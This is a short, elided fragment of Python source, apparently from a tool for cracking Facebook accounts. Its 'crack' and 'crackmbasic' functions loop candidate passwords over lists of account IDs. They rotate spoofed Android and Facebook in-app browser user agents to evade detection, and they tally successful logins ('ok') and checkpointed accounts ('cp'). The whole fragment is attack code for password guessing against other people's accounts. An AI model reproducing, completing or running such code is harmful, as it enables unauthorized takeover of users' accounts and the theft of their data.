...
def crack(idf,pwv):
	...
	ua = 'Mozilla/5.0 (Linux; Android 12; V2044 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/370.0.0.23.112;]'
...
def crackmbasic(idf,pwv):
	...
	fff = '%'
	print('\r%s%s/%s ok:%s/cp:%s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = 'Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0 YouBrowser/1.0.9'
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
